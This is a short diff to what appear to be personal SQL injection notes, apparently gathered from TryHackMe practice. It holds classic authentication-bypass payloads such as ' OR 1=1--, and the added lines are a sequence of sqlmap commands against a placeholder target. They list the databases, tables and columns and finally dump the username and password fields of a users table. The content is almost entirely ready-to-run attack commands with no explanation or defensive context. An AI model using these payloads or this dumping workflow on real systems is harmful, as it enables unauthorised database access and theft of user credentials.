@@ -7,3 +7,9 @@
 ' OR 1=1-- 
 
 ' OR 1=1;-- #from tryhackme
+
+sqlmap -u "http://target.com/product?id=1"
+sqlmap -u "http://target.com/product?id=1" --dbs
+sqlmap -u "http://target.com/product?id=1" -D mydatabase --tables
+sqlmap -u "http://target.com/product?id=1" -D mydatabase -T users --columns
+sqlmap -u "http://target.com/product?id=1" -D mydatabase -T users -C username,password --dump
